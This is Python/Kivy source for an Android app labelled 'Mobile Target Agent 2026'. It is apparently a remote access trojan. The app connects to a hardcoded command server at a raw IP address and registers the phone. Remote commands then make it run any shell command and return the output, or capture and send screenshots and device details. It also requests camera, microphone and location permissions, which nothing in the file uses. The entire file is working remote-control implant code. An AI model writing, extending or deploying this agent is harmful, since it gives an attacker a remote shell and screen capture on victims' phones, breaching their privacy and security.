#!/usr/bin/env python3
"""
MOBILE TARGET AGENT 2026 - FIXED APK VERSION
Simplified mobile remote control agent for Android
Happy New Year 2026!
"""
import time
import threading
import subprocess
import os
import base64
import io
import sys
import platform
import random
import json
import socket

# Kivy imports for Android GUI
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput
from kivy.clock import Clock
from kivy.logger import Logger

try:
    import socketio
    import requests
except ImportError:
    print("⚠️ SocketIO not available - using basic mode")
    socketio = None
    requests = None

class MobileTargetAgent2026:
    def __init__(self):
        print("🎉 MOBILE TARGET AGENT 2026 STARTING...")
        print("📱 Happy New Year 2026!")
        
        # VPS Configuration
        self.vps_url = "http://88.222.213.177:8080"
        self.agent_id = f"mobile_target_2026_{random.randint(1000, 9999)}"
        
        # Agent settings
        self.running = False
        self.connected = False
        self.connection_stable = False
        
        # Initialize SocketIO if available
        if socketio:
            self.sio = socketio.Client(
                reconnection=True,
                reconnection_attempts=10,
                reconnection_delay=2,
                logger=False,
                engineio_logger=False
            )
            self.setup_events()
        else:
            self.sio = None
        
        # Initialize Android APIs
        self.android_api = None
        try:
            import android
            self.android_api = android
            self.request_basic_permissions()
        except ImportError:
            print("⚠️ Android API not available - running in test mode")
        
    def request_basic_permissions(self):
        """Request basic Android permissions"""
        try:
            from android.permissions import request_permissions, Permission
            
            permissions = [
                Permission.WRITE_EXTERNAL_STORAGE,
                Permission.READ_EXTERNAL_STORAGE,
                Permission.CAMERA,
                Permission.RECORD_AUDIO,
                Permission.ACCESS_FINE_LOCATION,
                Permission.ACCESS_COARSE_LOCATION,
                Permission.INTERNET
            ]
            
            request_permissions(permissions)
            print("✅ Basic permissions requested")
            
        except Exception as e:
            print(f"⚠️ Permission request error: {e}")
    
    def setup_events(self):
        """Setup SocketIO event handlers"""
        if not self.sio:
            return
            
        @self.sio.event
        def connect():
            print("✅ Connected to VPS server")
            self.connected = True
            self.connection_stable = True
            threading.Thread(target=self.register_agent, daemon=True).start()
        
        @self.sio.event
        def disconnect():
            print("❌ Disconnected from VPS server")
            self.connected = False
            self.connection_stable = False
        
        @self.sio.event
        def execute_command(data):
            print(f"💻 RECEIVED execute_command: {data}")
            command = data.get('command', '') if isinstance(data, dict) else str(data)
            threading.Thread(target=self.execute_command, args=(command,), daemon=True).start()
        
        @self.sio.event
        def TakeScreenshot(data):
            print(f"📸 RECEIVED TakeScreenshot: {data}")
            threading.Thread(target=self.take_screenshot, daemon=True).start()
        
        @self.sio.event
        def GetSystemInfo(data):
            print(f"ℹ️ RECEIVED GetSystemInfo: {data}")
            threading.Thread(target=self.get_system_info, daemon=True).start()
        
        @self.sio.event
        def ShowMessage(data):
            print(f"💬 RECEIVED ShowMessage: {data}")
            message = data.get('message', '') if isinstance(data, dict) else str(data)
            threading.Thread(target=self.show_message, args=(message,), daemon=True).start()
    
    def register_agent(self):
        """Register as mobile agent"""
        if not self.sio:
            return
            
        try:
            print("📡 Registering mobile agent...")
            
            device_info = self.get_device_info()
            
            registration_data = {
                'agent_id': self.agent_id,
                'agent_type': 'mobile',
                'capabilities': ['screen_sharing', 'commands', 'messages', 'system_info'],
                'platform': 'Android',
                'device_info': device_info,
                'version': '2026.2.0'
            }
            
            self.sio.emit('RegisterEnhancedAgent', registration_data)
            self.sio.emit('register_agent', registration_data)
            
            print("✅ Mobile agent registered successfully")
            
        except Exception as e:
            print(f"❌ Registration error: {e}")
    
    def get_device_info(self):
        """Get Android device information"""
        try:
            device_info = {
                'platform': platform.system(),
                'platform_release': platform.release(),
                'architecture': platform.machine(),
                'hostname': platform.node(),
                'python_version': platform.python_version(),
                'device_type': 'Android Mobile',
                'agent_version': '2026.2.0'
            }
            
            if self.android_api:
                device_info['android_api'] = 'Available'
                device_info['platform'] = 'Android'
            else:
                device_info['android_api'] = 'Not available'
            
            return device_info
            
        except Exception as e:
            print(f"⚠️ Device info error: {e}")
            return {'error': str(e)}
    
    def execute_command(self, command):
        """Execute system command on Android"""
        try:
            print(f"💻 EXECUTING: {command}")
            
            if command.lower() in ['screenshot', 'screen']:
                self.take_screenshot()
                return
            elif command.lower() in ['info', 'system', 'device']:
                self.get_system_info()
                return
            elif command.lower().startswith('message:'):
                message = command[8:].strip()
                self.show_message(message)
                return
            
            # Try to execute shell command
            try:
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                
                output = result.stdout if result.stdout else result.stderr
                if not output:
                    output = f"Command executed (exit code: {result.returncode})"
                
                print(f"✅ Command result: {output[:200]}...")
                
                if self.sio:
                    self.sio.emit('command_result_received', {
                        'agent_id': self.agent_id,
                        'command': command,
                        'result': output,
                        'agent_type': 'mobile',
                        'timestamp': time.time()
                    })
                
            except subprocess.TimeoutExpired:
                error_msg = f"Command timeout after 30 seconds"
                print(f"⚠️ {error_msg}")
                if self.sio:
                    self.sio.emit('command_result_received', {
                        'agent_id': self.agent_id,
                        'command': command,
                        'result': error_msg,
                        'agent_type': 'mobile',
                        'timestamp': time.time()
                    })
            
        except Exception as e:
            error_msg = f"Command execution error: {e}"
            print(f"❌ {error_msg}")
            if self.sio:
                self.sio.emit('command_result_received', {
                    'agent_id': self.agent_id,
                    'command': command,
                    'result': error_msg,
                    'agent_type': 'mobile',
                    'timestamp': time.time()
                })
    
    def take_screenshot(self):
        """Take single screenshot"""
        try:
            print("📸 Taking mobile screenshot...")
            screenshot_data = self.capture_screen()
            
            if screenshot_data and self.sio:
                self.sio.emit('Screenshot', [self.agent_id, screenshot_data])
                print("✅ Screenshot sent")
            else:
                print("❌ Screenshot failed")
                
        except Exception as e:
            print(f"❌ Screenshot error: {e}")
    
    def capture_screen(self):
        """Capture mobile screen"""
        try:
            # Try Android screenshot
            if self.android_api:
                try:
                    screenshot_path = "/sdcard/screenshot_temp.png"
                    os.system(f"screencap -p {screenshot_path}")
                    
                    if os.path.exists(screenshot_path):
                        with open(screenshot_path, 'rb') as f:
                            screenshot_data = base64.b64encode(f.read()).decode()
                        os.remove(screenshot_path)
                        return screenshot_data
                except Exception as e:
                    print(f"⚠️ Android screenshot error: {e}")
            
            # Fallback: Create dummy screenshot
            return self.create_dummy_screenshot()
            
        except Exception as e:
            print(f"❌ Screenshot error: {e}")
            return None
    
    def create_dummy_screenshot(self):
        """Create dummy screenshot for testing"""
        try:
            from PIL import Image, ImageDraw
            
            # Create image
            img = Image.new('RGB', (720, 1280), color='#2196F3')
            draw = ImageDraw.Draw(img)
            
            # Add text
            text = f"Mobile Agent 2026\n{self.agent_id}\n{time.strftime('%H:%M:%S')}"
            draw.multiline_text((50, 500), text, fill='white', align='center')
            
            # Convert to base64
            buffer = io.BytesIO()
            img.save(buffer, format='JPEG', quality=70)
            screenshot_data = base64.b64encode(buffer.getvalue()).decode()
            
            return screenshot_data
            
        except Exception as e:
            print(f"❌ Dummy screenshot error: {e}")
            return None
    
    def get_system_info(self):
        """Get mobile system information"""
        try:
            print("ℹ️ Getting mobile system info...")
            
            system_info = {
                'agent_id': self.agent_id,
                'platform': platform.system(),
                'platform_release': platform.release(),
                'architecture': platform.machine(),
                'hostname': platform.node(),
                'python_version': platform.python_version(),
                'device_type': 'Android Mobile',
                'agent_version': '2026.2.0',
                'timestamp': time.time()
            }
            
            if self.android_api:
                system_info['android_api'] = 'Available'
                system_info['platform'] = 'Android'
            else:
                system_info['android_api'] = 'Not available'
            
            if self.sio:
                self.sio.emit('SystemInfo', [self.agent_id, system_info])
            print("✅ System info sent")
            
        except Exception as e:
            print(f"❌ System info error: {e}")
            if self.sio:
                self.sio.emit('SystemInfo', [self.agent_id, {'error': str(e)}])
    
    def show_message(self, message):
        """Show message on mobile device"""
        try:
            print(f"💬 Showing message: {message}")
            
            if self.sio:
                self.sio.emit('MessageResult', [self.agent_id, f"Message displayed: {message}"])
            print("✅ Message result sent")
            
        except Exception as e:
            print(f"❌ Message error: {e}")
            if self.sio:
                self.sio.emit('MessageResult', [self.agent_id, f"Message error: {e}"])
    
    def connect_to_server(self):
        """Connect to VPS server"""
        if not self.sio:
            print("⚠️ SocketIO not available")
            return False
            
        try:
            print(f"🔗 Connecting to {self.vps_url}...")
            self.running = True
            self.sio.connect(self.vps_url, wait_timeout=10)
            return True
            
        except Exception as e:
            print(f"❌ Connection error: {e}")
            return False
    
    def disconnect_from_server(self):
        """Disconnect from server"""
        try:
            self.running = False
            if self.sio and self.connected:
                self.sio.disconnect()
            print("✅ Disconnected from server")
            
        except Exception as e:
            print(f"❌ Disconnect error: {e}")
    
    def run_agent(self):
        """Run the mobile agent"""
        print("🚀 Starting Mobile Target Agent 2026...")
        
        # Try to connect
        if self.connect_to_server():
            print("✅ Agent connected and running")
            
            # Keep running
            try:
                while self.running:
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\n⏹️ Agent stopped by user")
        else:
            print("❌ Failed to connect to server")
        
        self.disconnect_from_server()

class MobileAgentApp(App):
    def __init__(self):
        super().__init__()
        self.agent = None
        
    def build(self):
        """Build the Kivy GUI"""
        print("🎨 Building Mobile Agent GUI...")
        
        # Main layout
        layout = BoxLayout(orientation='vertical', padding=20, spacing=10)
        
        # Title
        title = Label(
            text='📱 Mobile Target Agent 2026\n🎉 Happy New Year 2026!',
            font_size='20sp',
            size_hint_y=None,
            height=100,
            halign='center'
        )
        layout.add_widget(title)
        
        # Status label
        self.status_label = Label(
            text='Status: Starting...',
            font_size='16sp',
            size_hint_y=None,
            height=50
        )
        layout.add_widget(self.status_label)
        
        # Agent ID label
        self.agent_id_label = Label(
            text='Agent ID: Initializing...',
            font_size='14sp',
            size_hint_y=None,
            height=40
        )
        layout.add_widget(self.agent_id_label)
        
        # VPS URL input
        self.vps_input = TextInput(
            text='http://88.222.213.177:8080',
            hint_text='VPS Server URL',
            size_hint_y=None,
            height=40,
            multiline=False
        )
        layout.add_widget(self.vps_input)
        
        # Connect button
        self.connect_btn = Button(
            text='🔗 Connect to Server',
            size_hint_y=None,
            height=50
        )
        self.connect_btn.bind(on_press=self.connect_agent)
        layout.add_widget(self.connect_btn)
        
        # Disconnect button
        self.disconnect_btn = Button(
            text='❌ Disconnect',
            size_hint_y=None,
            height=50,
            disabled=True
        )
        self.disconnect_btn.bind(on_press=self.disconnect_agent)
        layout.add_widget(self.disconnect_btn)
        
        # Screenshot button
        screenshot_btn = Button(
            text='📸 Take Screenshot',
            size_hint_y=None,
            height=50
        )
        screenshot_btn.bind(on_press=self.take_screenshot)
        layout.add_widget(screenshot_btn)
        
        # System info button
        info_btn = Button(
            text='ℹ️ System Info',
            size_hint_y=None,
            height=50
        )
        info_btn.bind(on_press=self.get_system_info)
        layout.add_widget(info_btn)
        
        # Initialize agent
        self.agent = MobileTargetAgent2026()
        self.agent_id_label.text = f'Agent ID: {self.agent.agent_id}'
        
        # Update status periodically
        Clock.schedule_interval(self.update_status, 1.0)
        
        return layout
    
    def connect_agent(self, instance):
        """Connect agent to server"""
        try:
            self.agent.vps_url = self.vps_input.text.strip()
            
            def connect_thread():
                if self.agent.connect_to_server():
                    Clock.schedule_once(lambda dt: self.on_connected(), 0)
                else:
                    Clock.schedule_once(lambda dt: self.on_connection_failed(), 0)
            
            threading.Thread(target=connect_thread, daemon=True).start()
            
            self.connect_btn.text = '🔄 Connecting...'
            self.connect_btn.disabled = True
            
        except Exception as e:
            print(f"❌ Connect error: {e}")
    
    def on_connected(self):
        """Called when agent connects"""
        self.connect_btn.text = '✅ Connected'
        self.disconnect_btn.disabled = False
        self.status_label.text = 'Status: Connected ✅'
    
    def on_connection_failed(self):
        """Called when connection fails"""
        self.connect_btn.text = '🔗 Connect to Server'
        self.connect_btn.disabled = False
        self.status_label.text = 'Status: Connection Failed ❌'
    
    def disconnect_agent(self, instance):
        """Disconnect agent from server"""
        try:
            self.agent.disconnect_from_server()
            
            self.connect_btn.text = '🔗 Connect to Server'
            self.connect_btn.disabled = False
            self.disconnect_btn.disabled = True
            self.status_label.text = 'Status: Disconnected ❌'
            
        except Exception as e:
            print(f"❌ Disconnect error: {e}")
    
    def take_screenshot(self, instance):
        """Take screenshot"""
        try:
            threading.Thread(target=self.agent.take_screenshot, daemon=True).start()
            self.status_label.text = 'Status: Taking Screenshot 📸'
            
        except Exception as e:
            print(f"❌ Screenshot error: {e}")
    
    def get_system_info(self, instance):
        """Get system info"""
        try:
            threading.Thread(target=self.agent.get_system_info, daemon=True).start()
            self.status_label.text = 'Status: Getting System Info ℹ️'
            
        except Exception as e:
            print(f"❌ System info error: {e}")
    
    def update_status(self, dt):
        """Update status display"""
        try:
            if self.agent:
                if self.agent.connected:
                    self.status_label.text = 'Status: Connected ✅'
                elif self.agent.running:
                    self.status_label.text = 'Status: Connecting... 🔄'
                else:
                    self.status_label.text = 'Status: Disconnected ❌'
                    
        except Exception as e:
            print(f"⚠️ Status update error: {e}")

if __name__ == '__main__':
    print("🎉 Starting Mobile Target Agent 2026 APK")
    print("📱 Happy New Year 2026!")
    
    # Run the Kivy app
    MobileAgentApp().run()
